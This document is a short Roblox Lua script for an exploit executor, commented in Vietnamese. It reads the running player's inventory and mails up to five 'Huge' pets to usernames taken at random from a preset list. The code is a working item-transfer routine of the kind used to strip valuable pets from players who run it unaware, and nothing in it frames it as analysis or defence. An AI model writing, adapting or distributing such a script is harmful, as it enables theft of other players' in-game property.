getgenv().usernames = {"Username1", "Username2", "Username3"}  -- Danh sách các username được định sẵn.

local usernames = getgenv().usernames

-- Yêu cầu module Save từ ReplicatedStorage để lấy thông tin lưu trữ.
local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
-- Lấy kết quả thông tin lưu trữ của người chơi.
local result = saveModule.Get()

-- Lấy danh sách pet từ kết quả.
local pet = result.Inventory.Pet
-- Biến để theo dõi số lượng Huge đã gửi.
local hugeSentCount = 0

-- Duyệt qua danh sách pet.
for i, v in pairs(pet) do
    -- Kiểm tra nếu pet có ID chứa từ "Huge".
    if string.match(v.id, "Huge") then
        -- Chọn ngẫu nhiên một username từ danh sách.
        local username = usernames[math.random(#usernames)]
        
        -- Tạo một bảng chứa thông tin để gửi qua hệ thống thư.
        local args = {
            username, -- Tên người dùng nhận pet được chọn ngẫu nhiên.
            v.id, -- ID của pet Huge.
            "Pet", -- Loại của item đang gửi là Pet.
            i, -- Index của pet trong danh sách.
            v._am or 1 -- Số lượng của pet, nếu không có thông tin thì mặc định là 1.
        }
        
        -- Gọi hàm InvokeServer trên RemoteEvent "Mailbox: Send" để gửi pet.
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        
        -- Tăng biến đếm và in ra thông báo.
        hugeSentCount = hugeSentCount + 1
        print("Đã gửi " .. v.id .. " đến " .. username)
        
        -- Kiểm tra giới hạn gửi pet.
        if hugeSentCount >= 5 then
            break -- Thoát khỏi vòng lặp sau khi gửi 5 pet Huge.
        end
    end
end

-- In ra tổng số Huge đã gửi.
print("Tổng số Huge đã gửi: " .. hugeSentCount)
